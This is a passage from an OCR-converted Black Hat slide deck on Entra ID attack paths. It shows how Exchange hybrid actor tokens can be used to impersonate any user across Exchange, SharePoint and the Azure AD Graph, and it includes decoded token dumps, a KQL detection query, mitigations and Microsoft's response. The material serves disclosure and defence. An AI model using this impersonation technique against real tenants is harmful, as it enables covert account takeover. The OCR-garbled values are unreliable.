I2LTRjODAtYWE1MC01MDQ5NjIzMTZlYjIiLCJ0cnVzdGVkZm9yZGVsZWdhdGlvbiI6InRydWUiLCJ4bXNfc3BjdSI6InRyd
JTgJAQzrVAztKO2FsCXCpCn2XgCOl2YmdSmDpmF76WogMyJxzbwXPNOGB3UdICb19vJCAaxl2F0XG3hJgKkShuWKhVuQS9q
96wWSyPxj5zyFCP7jOaCsRTXRNil7M1rLe6gak9c85s0Oxmr6ITqcpHEVCBBIIeLy6AdYpMO8gPyzlJqjtAp-iHSnwMWX3b
    "aud": "00000002-0000-0ff1-ce00-000000000000/outlook.office.com@6287f28f-4f7f-4322-9651-a86
    "exp": 1753219402,
    "iat": 1753219102,
    "iss": "00000002-0000-0ff1-ce00-000000000000@6287f28f-4f7f-4322-9651-a8697d8fe1bc",
    "nameid": "10032001E2CBE43B",
    "nbf": 1753219102,
    "nii": "urn:federation:MicrosoftOnline",
    "sip": "dirkjan@iminyour.cloud",
    "smtp": "dirkjan@iminyour.cloud",
    "upn": "dirkjan@iminyour.cloud"
}
```

## Slide 66

## Service to Service (S2S) tokens

- Valid for 24 hours

- Non-revokable

- No logs when they are issued

- Unsigned – so no traffic to Entra ID to use them – so again no logs

- Can impersonate anyone within the tenant for tokens that have “trustedfordelegation”, which most MSFT apps I tested have

- • No Conditional Access or any security checks at all

- Valid for any mailbox in Exchange online

- Can also be requested for SharePoint online, access any SharePoint site / OneDrive in the tenant

## Slide 67

S2S tokens


> Recovered by OCR — confidence 77/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
S2S tokens
EVERYTHING THE LIGHT,
TOUCHES IS OUR TENANT
But what's that Swicnosorraresuoll’
Shiadowy place over there? BAU USING 82s TOKENS i
```

## Slide 68

Ref: https://www.microsoft.com/en-us/security/blog/2025/07/08/enhancing-microsoft-365-security-by-eliminating-high-privilege-access/


> Recovered by OCR — confidence 89/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Best practices » July 8 » 3 min read
Enhancing Microsoft 365
security by eliminating high-
priv’ High-privileged access (HPA) occurs when an application or service obtains
ByNareshKe broad access to customer content, allowing it to impersonate other users
without providing any stele of user context. For example, Applications A and B
may have a service-to-s
seenmnta, Lropliicction A Microsoft’ S approach to access rights
Application B can acces
OCle wiiheuaweercan Eliminating HPA ensures that users and applications have only the necessary
access rights. Our strategy within Microsoft's internal Microsoft 365 environment
involved fostering an ‘assume breach’ mindset, with a focus on the stringent
enforcement of new standard authentication protocols. With this approach, we
havejsuccessfully mitigated more than 1,000 high-privilege application scenarios
thus far. Achieving this was a monumental cross-functional effort at Microsoft,
engaging more than 200 engineers across the company.
Ref: https://www.microsoft.com/en-us/security/blog/2025/07/08/enhancing-microsoft-365-security-by-eliminating-high-privilege-access/
```

## Slide 69

Modify synced user passwords
Entra ID Connect Modify service principals
Convert cloud-only user to hybrid
Modify policies
Seamless SSO
Configure SSSO / EAM
AD FS Impersonate hybrid user
Exchange Configure federation config
Full access to Exchange Online
Full access to SharePoint

## Slide 70

Demo

## Slide 71

## But wait… there is more

• What if we request an actor token for graph.windows.net?

## Slide 72


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 75/100 on the text kept, 67/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
(ROADtools) ➜  ROADtools git:(master) ✗ roadtx describe -f .roadtools_actortoken
{
    "alg": "RS256",
    "kid": "_jNwjeSnvTTK8XEdr5QUPkBRLLo",
    "typ": "JWT",
    "x5t": "_jNwjeSnvTTK8XEdr5QUPkBRLLo"
}
{
    "aud": "00000002-0000-0000-c000-000000000000/graph.windows.net@6287f28f-4f7f-4322-9651-a8697d8fe1bc",
    "exp": 1752668227,
    "iat": 1752581527,
    "identityprovider": "00000001-0000-0000-c000-000000000000@6287f28f-4f7f-4322-9651-a8697d8fe1bc",
    "iss": "00000001-0000-0000-c000-000000000000@6287f28f-4f7f-4322-9651-a8697d8fe1bc",
    "nameid": "00000003-0000-0ff1-ce00-000000000000@6287f28f-4f7f-4322-9651-a8697d8fe1bc",
    "nbf": 1752581527,
    "oid": "54b0fdbc-05a1-4c03-b7bb-e7a4fe3bed40",
    "rh": "1.AXQAj_KHYn9PIkOWUahpfY_hvAIAAAAAAAAAwAAAAAAAAACtAQB0AA.",
    "sub": "54b0fdbc-05a1-4c03-b7bb-e7a4fe3bed40",
    "trustedfordelegation": "true",
    "xms_spcu": "true"
}
(ROADtools) ➜  ROADtools git:(master) ✗ [illegible — line cut off by slide edge]
```

## Slide 73


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 84/100 on the text kept, 58/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
[illegible — partially visible line cut off at top of terminal panel]
(ROADtools) ➜  pocs git:(master) ✗ roadtx describe -f .roadtools_auth
{
    "alg": "none",
    "typ": "JWT"
}
{
    "actortoken": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Il9qTndqZVNudlRUSzhYRWRyN
QiOiIwMDAwMDAwMi0wMDAwLTBmZjEtY2UwMC0wMDAwMDAwMDAwMDAvb3V0bG9vay5vZmZpY2UuY29tQDYyODdmMj
MDAwMC1jMDAwLTAwMDAwMDAwMDAwMEA2Mjg3ZjI4Zi00ZjdmLTQzMjItOTY1MS1hODY5N2Q4ZmUxYmMiLCJpYXQi
l0eXByb3ZpZGVyIjoiMDAwMDAwMDEtMDAwMC0wMDAwLWMwMDAtMDAwMDAwMDAwMDAwQDYyODdmMjhmLTRmN2YtND
ZTAwLTAwMDAwMDAwMDAwMEA2Mjg3ZjI4Zi00ZjdmLTQzMjItOTY1MS1hODY5N2Q4ZmUxYmMiLCJvaWQiOiJhNzYx
I2LTRjODAtYWE1MC01MDQ5NjIzMTZlYjIiLCJ0cnVzdGVkZm9yZGVsZWdhdGlvbiI6InRydWUiLCJ4bXNfc3BjdS
JTgJAQzrVAztKO2FsCXCpCn2XgCOl2YmdSmDpmF76WogMyJxzbwXPNOGB3UdICb19vJCAaxl2F0XG3hJgKkShuWK
96wWSyPxj5zyFCP7jOaCsRTXRNil7M1rLe6gak9c85s0Oxmr6ITqcpHEVCBBIIeLy6AdYpMO8gPyzlJqjtAp-iHS
    "aud": "00000002-0000-0000-c000-000000000000/graph.windows.net@6287f28f-4f7f-4322-96
    "exp": 1753221066,
    "iat": 1753220766,
    "iss": "00000002-0000-0ff1-ce00-000000000000@6287f28f-4f7f-4322-9651-a8697d8fe1bc",
    "nameid": "1003200087D335D0",
    "nbf": 1753220766,
    "nii": "urn:federation:MicrosoftOnline",
    "sip": "dirkjan@iminyour.cloud",
    "smtp": "dirkjan@iminyour.cloud",
    "upn": "dirkjan@iminyour.cloud"
}
```

## Slide 74

NetId property


> Recovered by OCR — confidence 92/100 on the text kept, 67/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Netld property
Dirk-jan
displayName: "Global Administrator"
mobile: null
msExchMailboxGuid: null
msExchRecipientTypeDetails: null
onPremisesDistinguishedName: null
onPremisesObjectIdentifier: null
```

## Slide 75

Modify synced user passwords
Entra ID Connect Modify service principals
Convert cloud-only user to hybrid
Modify policies
Seamless SSO
Configure SSSO / EAM
AD FS Impersonate hybrid user
Exchange Configure federation config
Full access to EXO / SPO
Full access to Entra as any user

## Slide 76

Demo

## Slide 77

## Audit logs

• If you make changes with this method, the audit logs look “odd”


> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Audit logs
¢ If you make changes with this method, the audit logs look “odd”
Initiated by (actor)
Type User
Display Name Office 365 Exchange Online
Object ID 34cOabec-4cf2-490b-bbe1-2c7be9cabbb1
IP address 94.211
User Principal Name dirkjan@iminyour.cloud
```

## Slide 78

## Detection KQL

\```
AuditLogs
\```

- `| where not(OperationName has "group")`

- `| where not(OperationName == "Set directory feature on tenant")`

- `| where InitiatedBy has_all ( "Office 365 Exchange Online","user")`

- `| where InitiatedBy.user.displayName == "Office 365 Exchange Online"`

Thanks to Fabian Bader and FalconForce for validating the query and helping with fine-tuning it

## Slide 79

Establishing whether you are affected


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 85/100 on the text kept, 81/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
Establishing whether you are affected

ROADrecon

Home
Users
Groups
Devices
Administrative Units
Directory roles
Applications
Service Principals
Application roles
OAuth2 Permissions
MFA

Filter
exchange onlin

Name                                                            Type
Microsoft E…
Office 365 …

Office 365 Exchange Online

▾ keyCredentials: Array[3]
  ▾ 0: Object
    customKeyIdentifier: "31F25099B43C5C0470EC851838644A26C845C718"
    endDate: "2026-01-11T15:31:26Z"
    keyId: "04a4927b-d46e-4026-b7ad-35f5c325a8e6"
    startDate: "2025-06-19T07:19:06Z"
    type: "AsymmetricX509Cert"
    usage: "Verify"
    value: "MIICrjCCAZagAwIBAgIUTtiR+6Wo3KmNoO1vlfBtP7ZrxrAwDQYJKoZIhvcNAQELBQAw
  ▾ 1: Object
    customKeyIdentifier: "3749786C4F6440B27AB76F90437EF6338138E74F"
    endDate: "2029-06-09T15:59:08Z"
    keyId: "a6df8a00-4fb2-43cf-b278-23f57e1bdda5"
    startDate: "2024-07-05T15:59:08Z"
    type: "AsymmetricX509Cert"
    usage: "Verify"
    value: "MIIDKTCCAhGgAwIBAgIQQrMYkrIRwJlHO2Z2+aZ3UzANBgkqhkiG9w0BAQsFADA1MTMw
  ▾ 2: Object
    customKeyIdentifier: "2B1A04A47158EA7130B3711B548669A8089FB582"
    endDate: "2030-02-25T19:06:58Z"
    keyId: "7f2dd328-cd13-48db-ac50-26cf96114cc4"
    startDate: "2025-02-25T18:56:58Z"
    type: "AsymmetricX509Cert"
    usage: "Verify"
    value: "MIIDJzCCAg+gAwIBAgIQMb1ctPiNCoVIbJ/z7HofojANBgkqhkiG9w0BAQsFADAZMRcw
```

## Slide 80

## Mitigation

- It is actually possible to “split” the service principals from Exchange on-prem and Exchange online, announced in April this year

- Will be required by October 2025

Ref: https://techcommunity.microsoft.com/blog/exchange/exchange-server-security-changes-for-hybrid-deployments/4396833

## Slide 81

## MSRC Response

- I did not think this is a vulnerability, just flawed design.

- Submitted it as a heads up to MSRC 2 weeks before Black Hat.

- The product team did consider it a vulnerability.

- They expedited a fix for the graph.windows.net impersonation.

- Blocked for 1<sup>st</sup> party Service Principal credentials since last Friday.

- Exchange / SharePoint impersonation still possible for now.

## Slide 82

Modify synced user passwords
Entra ID Connect Modify service principals
Convert cloud-only user to hybrid
Modify policies
Seamless SSO
Configure SSSO / EAM
AD FS Impersonate hybrid user
Exchange Configure federation config
Full access to EXO / SPO
Full access to Entra as any user

## Slide 83

## Conclusions

- Entra ID connect on-prem was way more powerful than you thought.

- Most attack paths from Entra ID connect are now mitigated.

- Exchange hybrid on-prem = Exchange online.

- Exchange online has/had unrestricted access in your tenant through S2S actor tokens with impersonation rights.

- S2S actor tokens design is messed up, should never have existed and the impersonation should be removed ASAP.

- Lack of transparency about internal auth protocols hurts security.

- Customers running Exchange hybrid should apply mitigations to reduce the impact.

## Slide 84

## References / reading material

- Overwriting global admins via soft matching: <u>https://blog.fox-it.com/2019/06/06/syncing-yourself-to-global-administrator-in-azure-active-directory/</u>

- Overwriting eligible users: <u>https://www.semperis.com/blog/smtp-matching-abuse-in-azure-ad/</u>

- Seamless SSO abuse: <u>https://www.dsinternals.com/en/impersonating-office-365-users-mimikatz/</u>

- SAML security considerations (AD FS attacks): <u>https://docs.oasis-open.org/security/saml/v2.0/saml-sec-consider-2.0-os.pdf</u>

- Internal Azure AD graph API: <u>https://dirkjanm.io/assets/raw/Im%20in%20your%20cloud%20bluehat-v1.0.pdf</u>

- S2S tokens (SharePoint specific) <u>https://learn.microsoft.com/en-us/openspecs/sharepoint_protocols/ms-sps2sauth/f80a09df-8e0e-434f-93bd-a348d52a8022</u>

- Exchange hybrid authentication Oauth2 setup: <u>https://learn.microsoft.com/en-us/exchange/configure-oauth-authentication-between-exchange-and-exchange-online-organizationsexchange-2013-help</u>

- Dumping Entra ID connect credentials: <u>https://dirkjanm.io/updating-adconnectdump-a-journey-into-dpapi/</u>

- Adding credentials to first-party apps as application admin: <u>https://dirkjanm.io/azure-ad-privilege-escalation-application-admin/</u>

- Other talks on these topics: <u>https://dirkjanm.io/talks/</u>

- Other great Entra Connect based abuse: <u>https://specterops.io/blog/2025/07/30/entra-connect-attacker-tradecraft-part-3/ (and the previous parts linked there)</u>

## Slide 85

# Advanced Active Directory to Entra ID lateral movement techniques

Dirk-jan Mollema

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 95/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
BRIEFINGS
AUGUST 6-7, 2025
MANDALAY BAY / LAS VEGAS
Advanced Active Directory to Entra ID
lateral movement techniques
Dirk-jan Mollema
```
